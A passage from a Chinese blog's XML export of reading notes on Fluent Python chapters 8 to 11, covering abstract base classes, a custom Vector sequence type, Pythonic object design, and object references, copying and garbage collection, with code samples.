定义抽象基类的子类要想实现子类，可以覆盖从抽象基类中继承的方法，以更高效的方式重新实现。例如__contains__方法会扫描序列，如果你定义的序列按顺序排列，那么就可以重新定义这个方法使用bisect函数二分查找。 标准库中的抽象基类collections.abc模块Python 标准库中有两个abc模块，一个是collections.abc， 另一个是abc.ABC，后者是所有抽象基类的依赖。collections.abc类中有16个抽象基类，它们的继承关系如下图所示: Iterable、Container 和 Sized 各个集合应该继承这三个抽象基类，或者至少实现兼容的协议。Iterable 通过__iter__方法支持迭代，Container 通过 __contains__ 方法支持 in 运算符，Sized通过 __len__ 方法支持 len() 函数。 Sequence、Mapping 和 Set 这三个是主要的不可变集合类型，而且各自都有可变的子类。 MappingView 在 Python 3 中，映射方法 .items()、.keys() 和 .values() 返回的对象分别是ItemsView 、KeysView 和 ValuesView 的实例。前两个类还从 Set 类继承了丰富的接口，包含 3.8.3 节所述的全部运算符。 Callable 和 Hashable 这两个抽象基类与集合没有太大的关系，只不过因为 collections.abc 是标准库中定义抽象基类的第一个模块，而它们又太重要了，因此才把它们放到 collections.abc模块中。这两个抽象基类的主要作用是为内置函数 isinstance 提供支持，以一种安全的方式判断对象能不能调用或散列。若想检查是否能调用，可以使用内置的 callable() 函数；但是没有类似的 hashable() 函数，因此测试对象是否可散列，最好使用 isinstance(my_obj, Hashable)。 Iterator 它是 Iterable 的子类。 抽象基类中的数字塔numbersnumbers包定义的是数字塔，包含的类如下，通过类名即可判断出他们的继承关系: Number Complex Real Rational Integral 本章小结本章介绍了Python中非正式接口(协议的高动态本性)，以及Python中接口的运作方式，同时介绍了Python中的抽象基类及其类别和用途。 尽管抽象基类使得类型检查变得更容易了，但不应该在程序中过度使用它。Python 的核心在于它是一门动态语言，它带来了极大的灵活性。如果处处都强制实行类型约束，那么会使代码变得更加复杂，而本不应该如此。我们应该拥抱 Python 的灵活性.“如果觉得自己想创建新的抽象基类，先试着通过常规的鸭子类型来解决问题。”]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>protocal</tag>
        <tag>abstract basic class</tag>
        <tag>ABC</tag>
        <tag>fluent python</tag>
        <tag>interfaces</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第十章小结]]></title>
    <url>%2F2018%2F05%2F07%2Ffluent-python-10%2F</url>
    <content type="text"><![CDATA[Fluent PythonChapter 10. Sequence Hacking, Hashing, and Slicing第十章: 序列的修改、散列和切片 这章以上章的Vector2d为基础，定义多维向量，这个类的行为和Python标准的扁平序列一样。将实现下面的功能： 基本的序列协议—— __len__ 和 __getitem__ 正确表述拥有很多元素的实例 适当的切片支持，用于生成新的 Vector 实例 综合各个元素的值计算散列值 自定义的格式语言扩展 此外，我们还将通过 getattr 方法实现属性的动态存取，以此取代 Vector2d 使用的只读特性——不过，序列类型通常不会这么做。 Vector类：用户自定义的序列类型序列类型的构造方法最好接受可迭代的对象为参数, 首先我们为vector加上这个构造方法 12345678910111213141516171819202122232425262728293031from array import arrayimport reprlibimport mathclass Vector: typecode = 'd' def __init__(self, components): # 将vector的分量存储在_components中 # self._components是迭代器 self._components = array(self.typecode, components) def __iter__(self): return iter(self._components) def __repr__(self): # 使用 reprlib.repr() 函数获取 self._components 的有限长度表示形式 components = reprlib.repr(self._components) components = components[components.find('['):-1] return 'Vector(&#123;&#125;)'.format(components) def __str__(self): return str(tuple(self)) def __bytes__(self): return (bytes([ord(self.typecode)])+bytes(self._components)) def __eq__(self, other): return tuple(self) == tuple(other) def __abs__(self): return math.sqrt(sum(x * x for x in self)) def __bool__(self): return bool(abs(self)) @classmethod def frombytes(cls, octets): typecode = chr(octets[0]) memv = memoryview(octets[1:]).cast(typecode) return cls(memv) 注： reprlib.repr 的方式需要做些说明。这个函数用于生成大型结构或递归结构的安全表示形式，它会限制输出字符串的长度，用 ‘…’ 表示截断的部分。 调用 repr() 函数的目的是调试，因此绝对不能抛出异常。如果 \_repr__ 方法的实现有问题，那么必须处理，尽量输出有用的内容，让用户能够识别目标对象。_ 协议和鸭子类型在 Python 中创建功能完善的序列类型无需使用继承，只需实现符合序列协议的方法。不过，这里说的协议是什么呢？在面向对象编程中，协议是非正式的接口，只在文档中定义，在代码中不定义。例如，Python 的序列协议只需要 __len__ 和 __getitem__ 两个方法。任何类（如 Spam），只要使用标准的签名和语义实现了这两个方法，就能用在任何期待序列的地方。Spam 是不是哪个类的子类无关紧要，只要提供了所需的方法即可。 注： 鸭子类型：“当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。” 协议是非正式的，没有强制力，因此如果你知道类的具体使用场景，通常只需要实现一个协议的部分。例如，为了支持迭代，只需实现 __getitem__ 方法，没必要提供 __len__方法。 Vector:可切片的序列添加__len__ 和 __getitem__方法后就可以实现基本的切片了 1234567class Vector: # 省略了很多行 # ... def __len__(self): return len(self._components) def __getitem__(self, index): return self._components[index] 但是这样实现的切片会存在一个问题， 就是切片得到的结果是数组而不是新的Vector类 切片原理首先通过一个例子查看切片的原理: 123456789101112131415&gt;&gt;&gt; class MySeq:... def __getitem__(self, index):... return index... &gt;&gt;&gt; s = MySeq()&gt;&gt;&gt; s[1]1&gt;&gt;&gt; s[1:4]slice(1, 4, None)&gt;&gt;&gt; s[1:4:2]slice(1, 4, 2)&gt;&gt;&gt; s[1:4:2, 9](slice(1, 4, 2), 9)&gt;&gt;&gt; s[1:4:2, 7:9](slice(1, 4, 2), slice(7, 9, None)) slice(1, 4, 2) 表示的是 从1开始, 到4结束, step是2(左开右闭) slice 有一个有趣的方法indices S.indices(len) -&gt; (start, stop, stride)给定长度为 len 的序列，计算 S 表示的扩展切片的起始（start）和结尾（stop）索引，以及步幅（stride）。超出边界的索引会被截掉，这与常规切片的处理方式一样。 换句话说，indices 方法开放了内置序列实现的棘手逻辑，用于优雅地处理缺失索引和负数索引，以及长度超过目标序列的切片。这个方法会“整顿”元组，把 start、stop 和stride 都变成非负数，而且都落在指定长度序列的边界内。下面举几个例子。假设有个长度为 5 的序列，例如 ‘ABCDE’： 1234&gt;&gt;&gt; slice(None, 10, 2).indices(5)(0, 5, 2)&gt;&gt;&gt; slice(-3, None, None).indices(5)(2, 5, 1) ‘ABCDE’[:10:2] 等同于 ‘ABCDE’[0:5:2]‘ABCDE’[-3:] 等同于 ‘ABCDE’[2:5:1] 能处理切片的__getitem__方法对上文提到的Vector类的__getitem__方法 做出如下改动: 123456789def __getitem__(self, index): cls = type(self) if isinstance(index, slice): return cls(self._components[index]) elif isinstance(index, numbers.Integral): return self._components[index] else: msg = '&#123;cls.__name__&#125; indices must be integers' raise TypeError(msg.format(cls=cls)) 传入slice对象时，getitem会将_components 数组的切片构建成一个新的 Vector 实例 Vector 类： 动态存取属性我们想额外提供下述句法，用于读取向量的前四个分量： 12345&gt;&gt;&gt; v = Vector(range(10))&gt;&gt;&gt; v.x0.0&gt;&gt;&gt; v.y, v.z, v.t(1.0, 2.0, 3.0) 首先我们要了解一下Python中对象的属性查找机制: 简单来说，对 my_obj.x 表达式，Python 会检查 my_obj 实例有没有名为 x 的属性；如果没有，到类（my_obj.class）中查找；如果还没有，顺着继承树继续查找。 如果依旧找不到，调用 my_obj 所属类中定义的 getattr 方法，传入 self 和属性名称的字符串形式（如 ‘x’）。 下面我们为Vector类增加 __getattr__方法: 123456789shortcut_names = 'xyzt'def __getattr__(self, name): cls = type(self) if len(name) == 1: pos = cls.shortcut_names.find(name) if 0 &lt;= pos &lt; len(self._components): return self._components[pos] msg = '&#123;.__name__!r&#125; object has no attribute &#123;!r&#125;' raise AttributeError(msg.format(cls, name) 这样的实现可以初步达到我们需要的效果，但是可能会出现下面的矛盾情形： 12345678910&gt;&gt;&gt; v = Vector(range(5))&gt;&gt;&gt; vVector([0.0, 1.0, 2.0, 3.0, 4.0])&gt;&gt;&gt; v.x0.0&gt;&gt;&gt; v.x = 10&gt;&gt;&gt; v.x10&gt;&gt;&gt; vVector([0.0, 1.0, 2.0, 3.0, 4.0]) 这里对v.x赋值并没有改变Vector第一分量的值，这样赋值只是让Vector类多了一个名为x的属性。 为了避免这种情况出现我们需要实现一个__setattr__方法：12345678910111213def __setattr__(self, name, value): cls = type(self) if len(name) == 1: if name in cls.shortcut_names: error = 'readonly attribute &#123;attr_name!r&#125;' elif name.islower(): error = "can't set attributes 'a' to 'z' in &#123;cls_name!r&#125;" else: error = '' if error: msg = error.format(cls_name=cls.__name__, attr_name=name) raise AttributeError(msg) super().__setattr__(name, value) 对单个字符的属性进行单独处理。 有一个问题要特别注意：多数时候，如果实现了 getattr 方法，那么也要定义 setattr 方法，以防对象的行为不一致。如果想允许修改分量，可以使用 setitem 方法，支持 v[0] = 1.1 这样的赋值，以及（或者）实现 setattr 方法，支持 v.x = 1.1 这样的赋值 Vector类： 散列和快速等值测试实现__hash__方法，加上现有的__eq__方法我们使用^（异或）运算符依次计算各个分量的散列值，像这样：v[0] ^ v[1] ^ v[2]…。需要用到归约函数reduce 下面提供了三种计算累计异或的方式：12345678910&gt;&gt;&gt; n = 0&gt;&gt;&gt; for i in range(1, 6):... n ^= i...&gt;&gt;&gt; n1 &gt;&gt;&gt; import functools&gt;&gt;&gt; functools.reduce(lambda a, b: a^b, range(6))1 &gt;&gt;&gt; import operator&gt;&gt;&gt; functools.reduce(operator.xor, range(6))1 显然第三种比较简洁， 本书的第五章讲过， 尽量避免lambda表达式的使用。 增加的__hash__方法如下: 123def __hash__(self): hashes = (hash(x) for x in self._components) return functools.reduce(operator.xor, hashes, 0) 这是一种映射归约运算 映射归约：把函数应用到各个元素上，生成一个新序列（映射，map），然后计算聚合值（归约，reduce） 为了提高比较的效率修改__eq__方法(两种实现方式逻辑一样)：12345678910def __eq__(self, other): if len(self) != len(other): return False for a, b in zip(self, other): if a != b: return False return Truedef __eq__(self, other): return len(self) == len(other) and all(a == b for a, b in zip(self, other)) 格式化Vector 类的 __format__ 方法与 Vector2d 类的相似，但是不使用极坐标，而使用球面坐标（也叫超球面坐标），因为 Vector 类支持 n 个维度，而超过四维后，球体变成了“超球体”(n维球体)。 因此，我们会把自定义的格式后缀由 ‘p’ 变成 ‘h’下面是格式化的实现： 123456789101112131415161718192021import itertoolsdef angle(self, n): r = math.sqrt(sum(x * x for x in self[n:])) a = math.atan2(r, self[n-1]) if (n == len(self) - 1) and (self[-1] &lt; 0): return math.pi * 2 - a else: return adef angles(self): return (self.angle(n) for n in range(1, len(self)))def __format__(self, fmt_spec=''): if fmt_spec.endswith('h'): # 超球面坐标 fmt_spec = fmt_spec[:-1] coords = itertools.chain([abs(self)], self.angles()) outer_fmt = '&lt;&#123;&#125;&gt;' else: coords = self outer_fmt = '(&#123;&#125;)' components = (format(c, fmt_spec) for c in coords) return outer_fmt.format(', '.join(components)) 小结我们经常分析 Python 标准对象的行为，然后进行模仿，让 Vector 的行为符合 Python 风格。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>fluent python</tag>
        <tag>对象</tag>
        <tag>pythonic</tag>
        <tag>slicing</tag>
        <tag>reduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第九章小结]]></title>
    <url>%2F2018%2F04%2F26%2Ffluent-python-9%2F</url>
    <content type="text"><![CDATA[Fluent Python 第九章读书报告 Chapter 9. A Pythonic Object第九章: Pythonic 的对象得益于 Python 数据模型，自定义类型的行为可以像内置类型那样自然。实现如此自然的行为，靠的不是继承，而是鸭子类型（duck typing）：我们只需按照预定行为实现对象所需的方法即可。 本章包含以下话题： 支持用于生成对象其他表示形式的内置函数（如 repr()、bytes()，等等） 使用一个类方法实现备选构造方法 扩展内置的 format() 函数和 str.format() 方法使用的格式微语言 实现只读属性 把对象变为可散列的，以便在集合中及作为 dict 的键使用 利用 __slots__ 节省内存 对象表示形式Python 提供了两种方式获取对象的字符串表示形式。 repr() 便于开发者理解的方式返回对象的字符串表示形式。 str() 便于用户理解的方式返回对象的字符串表示形式。 为了给对象提供其他的表示形式，还会用到另外两个特殊方法：__bytes__ 和__format__。__bytes__ 方法与 __str__ 方法类似：bytes() 函数调用它获取对象的字节序列表示形式。而 __format__ 方法会被内置的 format() 函数和 str.format() 方法调用，使用特殊的格式代码显示对象的字符串表示形式. 构建一个向量类向量类的实现如下： 123456789101112131415161718192021222324252627282930from array import arrayimport mathclass Vector2d: # typecode 是类属性，在 Vector2d 实例和字节序列之间转换时使用 typecode = 'd' # 初始化向量 def __init__(self, x, y): self.x = float(x) self.y = float(y) # 定义 __iter__ 方法，把 Vector2d 实例变成可迭代的对象，这样才能拆包（例如，x, y = my_vector）。这个方法的实现方式很简单，直接调用生成器表达式一个接一个产出分量。 def __iter__(self): return (i for i in (self.x, self.y)) # __repr__ 方法使用 &#123;!r&#125; 获取各个分量的表示形式，然后插值，构成一个字符串；因为 Vector2d 实例是可迭代的对象，所以 *self 会把 x 和 y 分量提供给 format 函数。 def __repr__(self): class_name = type(self).__name__ return '&#123;&#125;(&#123;!r&#125;, &#123;!r&#125;)'.format(class_name, *self) def __str__(self): return str(tuple(self)) # 为了生成字节序列，我们把 typecode 转换成字节序列，然后迭代 Vector2d 实例，得到一个数组，再把数组转换成字节序列。 def __bytes__(self): return (bytes([ord(self.typecode)])+bytes(array(self.typecode, self))) # 比较向量的值 def __eq__(self, other): return tuple(self) == tuple(other) # √x^2+y^2 def __abs__(self): return math.hypot(self.x, self.y) # 将模的值转化成布尔值 def __bool__(self): return bool(abs(self)) 备选构造方法上一节的vector实例可以将vector转化成字节序列，同理我们也可以将字节序列转化成vector。 vector2d_v1.py： 123456789101112from vector2d_v0 import Vector2d as vecclass Vector2d(vec): # 类方法 @classmethod # 使用cls传入类本身 def frombytes(cls, octets): typecode = chr(octets[0]) # 创建memoryview，使用typecode转换 memv = memoryview(octets[1:]).cast(typecode) # 拆包memoryview, 构造向量 return cls(*memv) classmethod 和 staticmethodpython 提供了两个装饰器来装饰类中定义的方法：classmethod 和 staticmethod classmethod 用来定义操作类而不是操作实例的方法。classmethod 最常见的方式就是定义备用的构造方法。 staticmethod 用来定义与实例无关的一些操作，相当于定位在类中的普通函数 格式化显示内置的 format() 函数和 str.format() 方法把各个类型的格式化方式委托给相应的.__format__(format_spec) 方法。format_spec 是格式说明符，它是：format(my_obj, format_spec) 的第二个参数，或者str.format() 方法的格式字符串，{} 里代换字段中冒号后面的部分. 1234567&gt;&gt;&gt; brl = 1/2.43&gt;&gt;&gt; brl0.4115226337448559&gt;&gt;&gt; format(brl, '0.4f') #【1】'0.4115'&gt;&gt;&gt; '1 BRL = &#123;rate:0.2f&#125; USD'.format(rate=brl) #【2】'1 BRL = 0.41 USD' 【1】中的’0.4f’是格式说明符【2】中格式说明符是’0.2f’, ‘rate’是字段名称，’{0.mass:5.3e}’这样的格式中， ‘0.mass’是字段名, ‘5.3e’是格式 格式规范微语言: 格式说明符使用的表示法, 格式规范微语言是可扩展的，因为各个类可以自行决定如何解释 format_spec 参数。 首先实现一个简单的格式化方法： 123def __format__(self, fmt_spec=''): components = (format(c, fmt_spec) for c in self) return '(&#123;&#125;, &#123;&#125;)'.format(*components) 这样可以实现如下效果： 1234567&gt;&gt;&gt; v1 = Vector2d(3, 4)&gt;&gt;&gt; format(v1)'(3.0, 4.0)'&gt;&gt;&gt; format(v1, '.2f')'(3.00, 4.00)'&gt;&gt;&gt; format(v1, '.3e')'(3.000e+00, 4.000e+00)' 下面增加一个自定义的格式说明符p, 如果格式说明符以 ‘p’ 结尾，那么在极坐标中显示向量，即 &lt;r, θ&gt;，其中 r 是模，θ是弧度 下面是实现： 12345678910111213def angle(self): return math.atan2(self.y, self.x)def __format__(self, fmt_spec=''): if fmt_spec.endswith('p'): fmt_spec = fmt_spec[:-1] coords = (abs(self), self.angle()) outer_fmt = '&lt;&#123;&#125;, &#123;&#125;&gt;' else: coords = self outer_fmt = '(&#123;&#125;, &#123;&#125;)' components = (format(c, fmt_spec) for c in coords) return outer_fmt.format(*components) 可散列的(hashable)Vector2d代码见 vector2d_v3.py目前Vector2d是不可散列的， 因此不能放入集合中，为了使得Vector2d变成可散列的，需要实现__hash__，并且让Vector2d不可变 首先需要让Vector2d不可变(使用@property装饰器装饰读值方法(getter)): 123456789def __init__(self, x, y): self.__x = float(x) self.__y = float(y)@propertydef x(self): return self.__x@propertydef y(self): return self.__y 这样x和y都是只读的了。接下来实现__hash__方法:123456789101112131415161718192021222324def __hash__(self): return hash(self.x) ^ hash(self.y)``` _注： 如果要实现一个可散列的类型，不一定要保护实例变量属性或者实现properties,只需要正确实现\_\_hash\_\_和\_\_eq\_\_即可，但是实例的hash值绝对不应该改变，所以这里会提到只读特性_## Python中的私有属性和受保护的属性为了避免子类覆盖父类的私有属性，如果以 \_\_mood 的形式（两个前导下划线，尾部没有或最多有一个下划线）命名实例属性，Python 会把属性名存入实例的 \_\_dict\_\_ 属性中，而且会在前面加上一个下划线和类名。因此，对 Dog 类来说，\_\_mood 会变成 \_Dog\_\_mood；对 Beagle类来说，会变成 \_Beagle\_\_mood。这个语言特性叫名称改写（name mangling）。_需要注意的是， 名称改写是一种安全措施，不能保证万无一失：它的目的是避免意外访问，不能防止故意做错事_Python 文档的某些角落把使用一个下划线前缀标记的属性称为“受保护的”属性。 使用self._x 这种形式保护属性的做法很常见，但是很少有人把这种属性叫作“受保护的”属性。有些人甚至将其称为“私有”属性。下面继续对 Vector2d 类进行改动。在最后一节中，我们将讨论一个特殊的属性（不是方法），它会影响对象的内部存储，对内存用量可能也有重大影响，不过对对象的公开接口没什么影响。这个属性是 \_\_slots\_\_## 使用\_\_slots\_\_类属性节省空间默认情况下，Python 在各个实例中名为 \_\_dict\_\_ 的字典里存储实例属性。如 3.9.3 节所述，为了使用底层的散列表提升访问速度，字典会消耗大量内存。如果要处理数百万个属性不多的实例，通过 \_\_slots\_\_ 类属性，能节省大量内存，方法是让解释器在元组中存储实例属性，而不用字典。```python class Vector2d: __slots__ = ('__x', '__y') typecode = 'd' 在类中定义 __slots__ 属性的目的是告诉解释器：“这个类中的所有实例属性都在这儿了！”这样，Python 会在各个实例中使用类似元组的结构存储实例变量，从而避免使用消耗内存的 __dict__ 属性。如果有数百万个实例同时活动，这样做能节省大量内存。 总之，如果使用得当，__slots__ 能显著节省内存，不过有几点要注意。每个子类都要定义 __slots__ 属性，因为解释器会忽略继承的 __slots__ 属性。实例只能拥有 __slots__ 中列出的属性，除非把 ‘__dict__‘ 加入 __slots__ （这样做就失去了节省内存的功效）。如果不把 ‘__weakref__‘ 加入 __slots__，实例就不能作为弱引用的目标。 覆盖类属性Python 有个很独特的特性：类属性可用于为实例属性提供默认值。 类属性是公开的，因此会被子类继承，于是经常会创建一个子类，只用于定制类的数据属性。Django基于类的视图就大量使用了这个技术。 小结本章的目的是说明，如何使用特殊方法和约定的结构，定义行为良好且符合 Python 风格的类。同时也提到了下面几种特殊方法的用法： 所有用于获取字符串和字节序列表示形式的方法：__repr__、__str__、__format__ 和 __bytes__。 把对象转换成数字的几个方法：__abs__、__bool__和 __hash__。 用于测试字节序列转换和支持散列（连同 __hash__ 方法）的 __eq__ 运算符。 提到了格式规范微语言 提到了使用__slots__节省内存 提到了使用继承的方式覆盖类属性的方法 最后：To build Pythonic objects, observe how real Python objects behave. — Ancient Chinese proverb（误）]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>fluent python</tag>
        <tag>对象</tag>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第八章小结]]></title>
    <url>%2F2018%2F04%2F25%2Ffluent-python-8%2F</url>
    <content type="text"><![CDATA[Fluent Python 第八章读书报告 Chapter 8. Object References, Mutability,and Recycling第八章:对象引用、可变性和垃圾回收本章的主题是对象与对象名称之间的区别。名称不是对象，而是单独的东西。先以一个比喻说明 Python 的变量：变量是标注，而不是盒子。本章的内容有点儿枯燥，但是这些话题却是解决 Python 程序中很多不易察觉的 bug 的关键。 变量不是盒子Python中的变量类似Java中的引用式变量，最好将它们理解为附加在对象上的标注。下面的控制台交互和图示很好的解释了”变量不是盒子”这一观点: 12345&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b=a&gt;&gt;&gt; a.append(4)&gt;&gt;&gt; b[1, 2, 3, 4] 对引用式变量来说，说把变量分配给对象更合理，反过来说就有问题。毕竟，对象在赋值之前就创建了。为了理解 Python 中的赋值语句，应该始终先读右边。对象在右边创建或获取，在此之后左边的变量才会绑定到对象上，这就像为对象贴上标注。 标识，相等性和别名首先看下面的例子和图示: 12345678910111213141516&gt;&gt;&gt; charles = &#123;'name': 'Charles L. Dodgson', 'born': 1832&#125;&gt;&gt;&gt; lewis = charles&gt;&gt;&gt; lewis is charlesTrue&gt;&gt;&gt; id(charles), id(lewis)(4300473992, 4300473992)&gt;&gt;&gt; lewis['balance'] = 950&gt;&gt;&gt; charles&#123;'name': 'Charles L. Dodgson', 'balance': 950, 'born': 1832&#125;&gt;&gt;&gt; alex = &#123;'name': 'Charles L. Dodgson', 'born': 1832, 'balance': 950&#125;&gt;&gt;&gt; alex == charlesTrue&gt;&gt;&gt; alex is not charlesTrue&gt;&gt;&gt; id(alex)4382361712 lewis 和 charles 是别名，即两个变量绑定同一个对象。而 alex 不是 charles 的别名，因为二者绑定的是不同的对象。alex 和charles 绑定的对象具有相同的值（== 比较的就是值），但是它们的标识不同。 每个变量都有标识、类型和值。对象一旦创建，它的标识绝不会变；你可以把标识理解为对象在内存中的地址。is 运算符比较两个对象的标识；id() 函数返回对象标识的整数表示。 is和==== 运算符比较两个对象的值（对象中保存的数据），而 is 比较对象的标识。通常，我们关注的是值，而不是标识，因此 Python 代码中 == 出现的频率比 is 高。 元组的相对不可变性元组与多数 Python 集合（列表、字典、集，等等）一样，保存的是对象的引用。 如果引用的元素是可变的，即便元组本身不可变，元素依然可变。也就是说，元组的不可变性其实是指 tuple 数据结构的物理内容（即保存的引用）不可变，与引用的对象无关。 下面的例子能显而易见地看出元组的相对不可变性: 12345678910111213&gt;&gt;&gt; t1 = (1, 2, [30, 40])&gt;&gt;&gt; t2 = (1, 2, [30, 40])&gt;&gt;&gt; t1 == t2True&gt;&gt;&gt; id(t1[-1])4302515784&gt;&gt;&gt; t1[-1].append(99)&gt;&gt;&gt; t1(1, 2, [30, 40, 99])&gt;&gt;&gt; id(t1[-1])4302515784&gt;&gt;&gt; t1 == t2False 默认做浅复制复制列表（或多数内置的可变集合）最简单的方式是使用内置的类型构造方法: 12345678&gt;&gt;&gt; l1 = [3, [55, 44], (7, 8, 9)]&gt;&gt;&gt; l2 = list(l1)&gt;&gt;&gt; l2[3, [55, 44], (7, 8, 9)]&gt;&gt;&gt; l2 == l1True&gt;&gt;&gt; l2 is l1False 这样构造出的l2和l1并不是同一个对象，l2 = l1[:] 也可以得到同样的效果。 然而，构造方法或 [:] 做的是浅复制（即复制了最外层容器，副本中的元素是源容器中元素的引用）。如果所有元素都是不可变的，那么这样没有问题，还能节省内存。但是，如果有可变的元素，可能会出现错误(l1, l2 会随着可变对象的修改同时发生变化)。 这时需要做深复制(deepcopy),下面的例子里我们会将深复制和浅复制对比:首先定义一个类 12345678910class Bus: def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = list(passengers) def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name) 接下来在控制台对类的实例进行操作:1234567891011121314&gt;&gt;&gt; from bus import Bus&gt;&gt;&gt; import copy&gt;&gt;&gt; bus1 = Bus(['Alice', 'Bill', 'Claire', 'David'])&gt;&gt;&gt; bus2 = copy.copy(bus1)&gt;&gt;&gt; bus3 = copy.deepcopy(bus1)&gt;&gt;&gt; id(bus1), id(bus2), id(bus3)(4571562840, 4571563288, 4571563512)&gt;&gt;&gt; bus1.drop('Bill')&gt;&gt;&gt; bus2.passengers['Alice', 'Claire', 'David']&gt;&gt;&gt; id(bus1.passengers), id(bus2.passengers), id(bus3.passengers)(4571550024, 4571550024, 4566929352)&gt;&gt;&gt; bus3.passengers['Alice', 'Bill', 'Claire', 'David'] bus2 是bus1的浅复制副本， bus3是深复制副本。 deepcopy 函数会记住已经复制的对象，因此能优雅地处理循环引用，下面的控制台交互是一个例子。 123456789&gt;&gt;&gt; a = [10, 20]&gt;&gt;&gt; b = [a, 30]&gt;&gt;&gt; a.append(b)&gt;&gt;&gt; a[10, 20, [[...], 30]]&gt;&gt;&gt; from copy import deepcopy&gt;&gt;&gt; c = deepcopy(a)&gt;&gt;&gt; c[10, 20, [[...], 30]] 函数的参数作为引用Python 唯一支持的参数传递模式是共享传参（call by sharing), 共享传参指函数的各个形式参数获得实参中各个引用的副本。也就是说，函数内部的形参是实参的别名。这种方案的结果是，函数可能会修改作为参数传入的可变对象，但是无法修改那些对象的标识（即不能把一个对象替换成另一个对象）。 下面的例子展示了函数会修改接收到的可变对象: 123456789101112131415161718192021&gt;&gt;&gt; def f(a, b):... a += b... return a...&gt;&gt;&gt; x = 1&gt;&gt;&gt; y = 2&gt;&gt;&gt; f(x, y)3 &gt;&gt;&gt; x, y(1, 2)&gt;&gt;&gt; a = [1, 2]&gt;&gt;&gt; b = [3, 4]&gt;&gt;&gt; f(a, b)[1, 2, 3, 4]&gt;&gt;&gt; a, b([1, 2, 3, 4], [3, 4])&gt;&gt;&gt; t = (10, 20)&gt;&gt;&gt; u = (30, 40)&gt;&gt;&gt; f(t, u)(10, 20, 30, 40)&gt;&gt;&gt; t, u((10, 20), (30, 40)) 可变类型不要作为传入参数默认值默认值在定义函数时计算（通常在加载模块时），因此默认值变成了函数对象的属性。如果默认值是可变对象，而且修改了它的值，那么后续的函数调用都会受到影响。 防止可变参数造成的影响下面的例子说明了可变参数可能造成的影响 1234567891011121314151617class TwilightBus: def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = passengers def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name)basketball_team = ['Sue', 'Tina', 'Maya', 'Diana', 'Pat']bus = TwilightBus(basketball_team)bus.drop('Tina')bus.drop('Pat')print(basketball_team)&gt;&gt;&gt; ['Sue', 'Maya', 'Diana'] 可以看到当乘客从bus上下车后，同时也从篮球队中剔除了，这是不合理的，这是由于传入参数的时候，passengers 仅仅是作为basketball_team的别名而不是创建了一个新对象，这样对passengers的操作会影响到basketball_team 解决办法如下(修改init函数)： 12345def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = list(passengers) 这样不仅可以防止可变参数造成的影响，同时还能让passengers的类型更加灵活（任何可迭代的对象） del和垃圾回收对象本身不会自行销毁，但当对象不能被获取时，可能会被当做垃圾回收。 del 语句删除名称，而不是对象。del 命令可能会导致对象被当作垃圾回收，但是仅当删除的变量保存的是对象的最后一个引用，或者无法得到对象时。 重新绑定也可能会导致对象的引用数量归零，导致对象被销毁。 在 CPython 中，垃圾回收使用的主要算法是引用计数。实际上，每个对象都会统计有多少引用指向自己。当引用计数归零时，对象立即就被销毁：CPython 会在对象上调用__del__ 方法（如果定义了），然后释放分配给对象的内存。CPython 2.0 增加了分代垃圾回收算法，用于检测引用循环中涉及的对象组——如果一组对象之间全是相互引用，即使再出色的引用方式也会导致组中的对象不可获取。注： Python 的其他实现有更复杂的垃圾回收程序，而且不依赖引用计数，这意味着，对象的引用数量为零时可能不会立即调用\_del__ 方法_ 下面的例子用weakref展示了一个对象生命周期结束时的场景： 12345678910111213141516import weakrefs1 = &#123;1, 2, 3&#125;s2 = s1def bye(): print('goodbye')ender = weakref.finalize(s1, bye)&gt;&gt;&gt; ender.aliveTrue&gt;&gt;&gt; del s1&gt;&gt;&gt; ender.aliveTrue&gt;&gt;&gt; s2 = 'sapm'goodbye&gt;&gt;&gt; ender.aliveFalse 弱引用正是因为有引用，对象才会在内存中存在。 弱引用不会增加对象的引用数量。引用的目标对象称为所指对象（referent）。因此我们说，弱引用不会妨碍所指对象被当作垃圾回收。 弱引用在缓存应用中很有用，因为我们不想仅因为被缓存引用着而始终保存缓存对象。 然而，weakref模块的文档指出，weakref.ref类其实是低层接口，供高级用途使用，多数程序最好使用 weakref 集合和 finalize。也就是说，应该使用 WeakKeyDictionary、WeakValueDictionary、WeakSet 和finalize（在内部使用弱引用），不要自己动手创建并处理 weakref.ref 实例。 WeakValueDictionary简介WeakValueDictionary 类实现的是一种可变映射，里面的值是对象的弱引用。被引用的对象在程序中的其他地方被当作垃圾回收后，对应的键会自动从 WeakValueDictionary中删除。因此，WeakValueDictionary 经常用于缓存。 下面是一个例子： 1234567891011121314151617181920class Cheese: def __init__(self, kind): self.kind = kind def __repr__(self): return 'Cheese(%r)' % self.kind&gt;&gt;&gt; import weakref&gt;&gt;&gt; stock = weakref.WeakValueDictionary()&gt;&gt;&gt; catalog = [Cheese('Red Leicester'), Cheese('Tilsit'), Cheese('Brie'), Cheese('Parmesan')]&gt;&gt;&gt; for cheese in catalog:... stock[cheese.kind] = cheese...&gt;&gt;&gt; sorted(stock.keys())['Brie', 'Parmesan', 'Red Leicester', 'Tilsit']&gt;&gt;&gt; del catalog&gt;&gt;&gt; sorted(stock.keys())['Parmesan']&gt;&gt;&gt; del cheese&gt;&gt;&gt; sorted(stock.keys())[] Parmesan 没有被删除仅仅是因为for循环中的cheese变量引用了它，这里的cheese是全局变量。 弱引用的局限不是每个 Python 对象都可以作为弱引用的目标（或称所指对象）。基本的 list 和 dict实例不能作为所指对象，但是它们的子类可以，int 和 tuple 实例不能作为弱引用的目标，甚至它们的子类也不行。 小结每个 Python 对象都有标识、类型和值。只有对象的值会不时变化。 变量保存的是引用，这一点对 Python 